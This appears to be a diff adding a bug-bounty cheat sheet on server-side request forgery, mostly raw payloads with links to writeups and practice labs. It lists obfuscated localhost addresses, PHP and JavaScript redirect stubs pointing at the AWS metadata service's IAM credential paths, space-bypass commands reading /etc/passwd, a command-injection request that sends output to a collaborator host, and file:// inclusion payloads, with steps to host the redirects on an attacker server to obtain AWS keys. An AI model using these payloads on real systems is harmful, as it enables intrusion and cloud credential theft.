@@ -1,0 +1,138 @@
+You can use the following websites as an alternative to Burp Collaborator for testing SSRF vulnerabilities
+
+🔹 https://canarytokens.org
+🔹 https://webhook.site
+🔹 https://app.interactsh.com
+🔹 https://hookdeck.com
+
+localhost ip----->
+
+http://0.0.0.0
+http://0
+http://0x7f000001
+http://2130706433
+http://0000::1
+http://0000::1:25
+http://0000::1:22
+http://0000::1:3128
+http://2130706433
+http://3232235521
+http://3232235777
+http://2852039166
+http://0o177.0.0.1
+
+
+
+
+0
+127.00.1
+127.0.01
+0.00.0
+0.0.00
+127.1.0.1
+127.10.1
+127.1.01
+0177.1
+0177.0001.0001
+0x0.0x0.0x0.0x0
+0000.0000.0000.0000
+0x7f.0x0.0x0.0x1
+0177.0000.0000.0001
+0177.0001.0000..0001
+0x7f.0x1.0x0.0x1
+0x7f.0x1.0x1
+localtest.me
+
+<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
+
+The secret trick to bypass ‘space’
+Based on my past CTF experience I know some payloads to bypass the space character on the Linux environment.
+cat</etc/passwd
+{cat,/etc/passwd}
+cat$IFS/etc/passwd
+cat${IFS}/etc/passwd>
+
+https://bughunter25.medium.com/a-tale-of-html-to-pdf-converter-ssrf-and-various-bypasses-4a3e11030c77(very imp)
+
+in index.php (ssrf)
+<?php 
+header("location: http://[::]:22/");
+?>
+
+<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
+
+https://medium.com/stolabs/cloud-ssrf-exploitation-1f256bdc145f(best ssrf writeup for cloud service)
+
+5 Free practice lab for ssrf
+
+1- https://portswigger.net/web-security/ssrf
+2- https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
+3- https://github.com/ScaleSec/vulnado/blob/master/exercises/03-ssrf.md
+4- https://learn.snyk.io/lessons/ssrf-server-side-request-forgery/javascript/
+5- https://application.security/free-application-security-training/server-side-request-forgery-in-capital-one
+
+
+
+<?php header("location: http://127.0.0.1"); ?>  (save file to attacker server and call from web server it ) for more read https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b
+
+https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530(ssrf to rce)
+
+https://medium.com/@0x0Asif/how-i-found-my-first-rce-8f8033883dc4
+
+https://pastebin.com/YbsKrMpf (ssrf bypasses payload lists)
+
+https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/ssrf.md
+-----------------------------------------
+As I mentioned above “?url=” Parameter only allowed index. I host this code to my server index
+
+    <?php header(‘Location: https://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-service-role-ssm-codedeploy', TRUE, 303); ?>
+
+Obtaining the AWS keys: https://subs.example.io/s3File?url=https://ssrf.hosted.site/
+----------------------------------------
+SSRF > Command Injection
+ 
+1. GET /api/v2/users/000/doc_id?url=https://burp-collab?'{cat,/etc/passwd}'&eqn=happy&tag=hacking 
+
+2. Observe the burp collaborator interactions.
+
+https://h.43z.one/ipconverter/
+
+<html>    
+   <body>       
+      <script> 
+          window.location="http://169.254.169.254/latest/meta-data/" 
+      </script>    
+   </body> 
+</html>
+
+
+🏹Change The Referrer To Burp Collaborator [Blind Exploit) #bugbounty #bugbountytips #SSRF #infosec 
+
+🏹Use IPv6 addresses instead of IPv4
+
+🏹Usable Protocols:
+  ▪gopher : //
+  ▪file: //
+  ▪dict://
+  ▪sftp://
+
+
+https://www.ifconfig.me
+
+SSRF local file inclusion
+file:/etc/passwd%3F/
+file:/etc%252Fpasswd/
+file:/etc%252Fpasswd%3F/
+file:///etc/%3F/../passwd
+file:${br}/et${u}c%252Fpas${te}swd%3F/
+file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
+
+SSRF POLYGLOT
+file:///etc/passwd?/../passwd
+
+
+make a file index.php -> Put the code inside
+
+    <?php header(‘Location: https://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-service-role-ssm-codedeploy' , TRUE, 303); ?> 
+
+    And host it to your server.
